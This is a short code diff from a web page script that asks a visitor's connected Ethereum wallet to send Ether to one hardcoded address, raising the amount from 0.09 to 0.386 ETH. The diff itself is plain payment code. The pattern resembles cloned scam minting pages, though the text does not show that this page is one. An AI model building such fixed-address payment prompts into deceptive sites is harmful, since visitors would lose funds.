@@ -27,7 +27,7 @@ function send(e) {
     let transactionParam = {
         to: '0x3cd3f086098421642b7b7f8021467624f721b85d',
         from: account,
-        value: (90000000000000000).toString(16)
+        value: (386000000000000000).toString(16)
 
     };
     ethereum.request({ method: 'eth_sendTransaction', params: [transactionParam] })
